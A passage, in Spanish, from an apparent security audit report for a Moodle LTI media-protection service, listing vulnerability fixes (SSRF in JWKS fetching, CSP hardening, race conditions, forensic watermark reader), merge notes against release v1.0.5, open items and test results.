  `viaOwner: false` explícito + prueba de regresión.
- **Alto — la carrera de V-26 seguía abierta en la purga automática.** Sólo
  arreglé el lado manual; `purgeRetiredRevisions` mantenía el UPDATE
  incondicional. Corregido con marca condicional y atómica (no purga si la
  revisión se reactivó).
- **Alto — la puerta de secretos del CI rompía el CI.** Al ampliarla a `.env.ci`
  incluí ficheros con valores de relleno de CI a propósito. Corregido: se excluye
  `.env.ci`.
- **Medio — ticket nativo caducado antes del play.** iOS aplaza la carga hasta el
  gesto de play; el ticket de 90 s podía caducar antes. Corregido: se vuelve a
  pedir ante el `error`, reanudando en la posición.
- **Medio — serializador de logs.** pino-http envuelve el serializador, así que
  recibía el objeto ya estándar (sin `socket`): perdía `remoteAddress`.
  Corregido mutando `url`/`originalUrl` sobre el objeto que llega.
- **Medio — `render.js` interpretaba `$&`.** El reemplazo por cadena disparaba
  los patrones `$$`/`$&`. Corregido usando función de reemplazo.
- **Medio — bypass por `:rid` en mayúsculas.** La comparación JS con el UUID (en
  minúsculas de pg) fallaba con un `:rid` en mayúsculas. Corregido normalizando.
- **Medio — controles por IP con el túnel.** Rate limit de clave y bloqueo de
  admin dependen de `req.ip`, poco fiable con el túnel (V-13). Retiré el rate
  limit de clave; el de admin queda documentado como dependiente de `TRUST_PROXY`.

La lección es la de siempre: los cambios de seguridad hay que verificarlos
adversarialmente, no darlos por correctos porque compilan y pasan el camino
feliz.

### 8.6 Reintegración sobre `main` (v1.0.5)

El trabajo de esta auditoría se preparó primero contra una `main` anterior
(v1.0.4). Cuando llegó el momento de subirlo, `main` ya había avanzado a
**v1.0.5** (reanudación de progreso, API de migración de contenido resumible,
`listInsertable…` en el Deep Linking, ajustes de transcodificación). Esta rama
(`feature/seguridad-auditoria`) parte de esa `main` de producción y trae encima
todo lo de seguridad. La base común de la fusión era exactamente v1.0.4, así que
sólo hubo que resolver los puntos donde v1.0.5 y la seguridad tocan lo mismo:

- **`src/app.js` (conflicto real).** v1.0.5 añade `app.use('/progress', …)` justo
  donde V-11 endurece el montaje del router de medios. Resolución **funcional**:
  se conservan **las dos cosas** —la ruta de progreso nueva y la condición de
  V-11 `if (!config.isProduction)`, que nunca sirve segmentos desde la app en
  producción con independencia de `MEDIA_DELIVERY`—.
- **`infra/local/.env` (borrar/modificar).** Mi entrega original lo sacaba del
  índice (`git rm --cached`); v1.0.5 lo modifica (afina `MARK_ALPHA=0.06` y añade
  `OUTPUT_CRF=21` para paridad con producción). Resolución **funcional**: se
  **mantiene versionado**. El propio fichero declara en su cabecera «Ajustes NO
  secretos del entorno local. Este fichero se versiona»; los secretos de ese
  entorno viven en `compose.yml` (dev, inseguros a propósito) y en un `.env.local`
  gitignorado. Sacarlo del índice rompería el flujo del equipo y perdería el
  afinado de v1.0.5, sin ganar nada real: el riesgo que señalaba **V-23** —que
  aterrice un token de verdad— lo cubre ahora el **gate de CI ampliado**, que
  recorre `infra/*/.env` y falla si una clave `*SECRET/PASSWORD/TOKEN/AUTHKEY*`
  trae valor. Fichero versionado **y** vigilado, en vez de fuera del índice.

El resto se combinó solo (sin marcadores de conflicto), pero lo verifiqué a mano
porque «fusión automática» sólo garantiza que no chocan los textos, no que el
resultado tenga sentido:

- `src/config.js`: conviven `playbackTicketTtlSeconds` y las validaciones de V-06/
  V-11 (mías) con `contentApi.token` y las de `TRANSCODE_CONCURRENCY`/
  `CONTENT_API_TOKEN` (v1.0.5).
- `src/session.js`: mis `issue/verify/readPlaybackTicket` y el `issuedAt` que
  v1.0.5 añade a `verifySession` son ortogonales.
- `src/ui/assets/video-component.js`: mi camino sin `?st=` (cabecera `Authorization`
  con hls.js; ticket `?pt=` sólo en el HLS nativo) y la reanudación por
  `startAtSeconds` de v1.0.5 tocan zonas distintas del componente.
- `src/lti/routes.js`: mis `adminBearerOk`/`platformsLimiter`/`createPlatform`
  conviven con `sessionAudit`/`getProgress` y el paso a `listInsertable…`. El
  import de `normalizePlatformInput` queda retirado (mi alta usa `createPlatform`,
  que valida por dentro) sin ninguna referencia colgando.
- `src/services/videos.js` y `documents.js`: `main` **conserva a propósito** las
  dos funciones —`listReady…` (estricta, aún ejercitada por
  `catalog.integration.js`) y `listInsertable…` (permite insertar material que aún
  se procesa)—; la fusión respeta ambas.

**Verificación tras la reintegración** (todo desde esta rama):

- `npm run lint` — limpio.
- `npm test` — **246 pruebas, 238 pasan, 0 fallan**, 8 saltadas (las de PDF, que
  necesitan `qpdf`/`pdfinfo`/`gs` de la imagen del worker).
- `npm run test:integration` — **87 pruebas, 87 pasan, 0 fallan** (incluye las de
  v1.0.5: `content-api`, `progress`).

No se tocó ninguna migración aplicada, ningún secreto de entorno ni ningún UUID
lógico. La rama queda lista para probar y subir.

### 8.7 Segunda iteración (10 de agosto de 2026)

La primera pasada cerró el riesgo de aplicación, sesión y logs. Ésta cierra casi
todo lo que 8.3 había dejado pendiente, arregla el trazador forense —que el
README declaraba roto— y añade la funcionalidad de colecciones con material en
cola. Todo sobre la misma rama, sin tocar ninguna migración aplicada, ningún
secreto de entorno ni ningún UUID lógico.

#### Lo que se cerró

| Hallazgo | Qué se hizo |
|---|---|
| **F-07 / T13** · el lector forense clasificaba mal | Causa: el lector restaba la luminancia de la esquina derecha menos la izquierda, y como el **contenido** de las dos esquinas es distinto, esa diferencia aplastaba la señal de la marca — todos los bits salían iguales, con riesgo de señalar a un inocente. Nuevo `src/media/trace-reader.js`: cada región se clasifica contra su propia distribución temporal, o contra los artefactos A/B originales descifrados del disco. Con test de regresión sobre los datos literales del diagnóstico y una e2e con ffmpeg real |
| **F-14** · purgar destruía la evidencia | Antes de borrar una revisión se escribe una **lápida forense** (ámbito del patrón, geometría, segmentos y la lista de quién la vio) fuera del directorio que la purga elimina; `tools/trace.mjs` sabe trazar desde ella. Y `legal_hold`, que existía en el esquema pero no se podía activar, ya tiene endpoint |
| **V-02 / F-05 / T24** · material de otro profesor | Fase de **aviso** desplegada: `custom.resourcesig` firmado en el Deep Linking, verificado en el launch con `LAUNCH_RESOURCE_SIGNATURE` (`off`/`warn`/`enforce`, por defecto `warn`), migración `011` con `deep_link_grant`. Ficha propia: `docs/tasks/backlog/T24-…` |
| **V-08 / F-09** · pdfjs vulnerable | `pdfjs-dist` 6.2.108 (`npm audit`: 0 vulnerabilidades). Y lo que hacía inútil el parche: `/vendor` se servía `immutable` 7 días **sin `?v=` en la URL**, así que un navegador con la versión vulnerable cacheada la habría seguido usando una semana después del despliegue |
| **V-14 / T33** · SSRF en el JWKS | El fetch de runtime va por el mismo transporte SSRF-seguro que ya usaba la consola (`customFetch` de `jose`), y el guard pasó de aviso opcional a **bloqueante** al guardar — incluido el alta por API, que antes ni lo miraba |
| **V-35** · scrypt | Suelo y techo en vez de igualdad exacta: un hash **más fuerte** ya se despliega sin tocar código |
| **T32** · `unsafe-inline` en la CSP | Retirado de `script-src`. No había ni un `<script>` ejecutable en línea salvo el `onload=` del formulario de Deep Linking, que pasó a `/assets/autosubmit.js` |
| **V-16** · permisos | `key.bin` y `key.info` se escriben `0600` |
| **V-33 / F-10** · contenedores | `no-new-privileges` y `pids_limit` en los cuatro servicios de test y prod, y la red partida en dos: **`db` y `worker` sin salida a Internet**. El worker es justo quien abre ficheros hostiles con ffmpeg, qpdf y Ghostscript |
| **T08** · worker | El heartbeat tolera fallos transitorios: un blip de red a Postgres ya no aborta una transcodificación de una hora. Y por fin hay prueba de que `stop_grace_period` supera `WORKER_SHUTDOWN_MS`, y del apagado ordenado |
| **T11** · player | Un 401 dejó de ser «Problema de red; reintentando…» en bucle infinito: ahora corta con un mensaje de sesión caducada. Reintentos acotados con retardo creciente y guarda en la recuperación de medio |

Además, funcionalidad pedida por el dueño: **las colecciones admiten material aún
en cola**. El profesor ya no espera al worker para montar la actividad; el visor
del alumno sondea el manifest y abre el material solo en cuanto se publica. El
backend ya lo permitía —la revisión de una sesión de colección se resuelve en
cada petición—, así que no hizo falta ni cambiar el esquema ni la autorización:
un ítem en cola sigue dando 404 hasta que existe revisión activa.

#### Lo que sigue abierto

- **T24 en `enforce`.** La firma está desplegada, pero el modo que de verdad
  cierra V-02 es `enforce`, y activarlo hoy rompería toda actividad insertada
  antes de la firma. El camino está escrito en la ficha de T24: observar el
  aviso hasta que deje de aparecer, y entonces cambiar la variable.
- **V-09 / T30 / T31** · detección y revocación de sesiones compartidas. Sigue
  siendo un subsistema nuevo y sigue sin empezar.
- **V-12 / T26** · ligar la firma de segmento a la IP. Depende de la topología
  (V-13) y cambia el manejo de cambios de red del reproductor.
- **`read_only` y `cap_drop: [ALL]`.** Chocan con el arranque como root del
  entrypoint, que baja a `node` con `su-exec`. Exige inventariar lo que ffmpeg y
  Ghostscript escriben fuera de los volúmenes, y probarlo en un host Linux.
- **El worker sigue recibiendo todos los secretos.** Comparte el bloque
  `*app-env` con la aplicación, así que ve `SESSION_SECRET`, `LTI_ADMIN_TOKEN` y
  las credenciales de administración que no necesita. Recortarlo exige que
  `config.js` sepa qué rol arranca: hoy valida las credenciales de admin en
  **todo** proceso de producción, así que quitárselas al worker le impediría
  arrancar. Es un refactor con riesgo de dejar producción sin arrancar, y por eso
  no se ha hecho a última hora.
- **La promesa forense completa** (recorte de bordes, colusión, audio): el lector
  está arreglado, la marca sigue viviendo sólo en dos esquinas del fotograma.
  Códigos de Tardos y marca en el audio son línea de producto, no un arreglo.

#### Verificación

| Comprobación | Resultado |
|---|---|
| `npm run lint` | limpio |
| `npm test` | 284 pruebas · 275 pasan · 9 saltadas · 0 fallan |
| `DB_PORT=5432 npm run test:integration` | 91 pruebas · 91 pasan · 0 fallan |
| `test/trace-reader.test.js` + `test/pdf-processing.test.js` dentro de `moodleshield/worker:local` | 19 · 19 pasan |
| `npm audit` | 0 vulnerabilidades |
| `docker compose config` de los tres entornos | los tres validan |

Las 9 saltadas en el host son las que necesitan `qpdf`/`pdfinfo`/`gs` o `ffmpeg`:
viven en la imagen del worker, que es donde se ejecutan y pasan.

#### Antes de desplegar

1. **El cambio de redes de los contenedores toca la topología**: desplegar
   primero en test y comprobar que `app` sigue alcanzando el JWKS de Moodle.
2. **Probar el visor de PDF** tras el salto a pdfjs 6.
3. **Comprobar la consola del navegador dentro de Moodle**: `script-src` perdió
   `'unsafe-inline'` y un bloqueo de CSP aparecería ahí.
4. Dejar `LAUNCH_RESOURCE_SIGNATURE` en `warn` y mirar el log unos días.
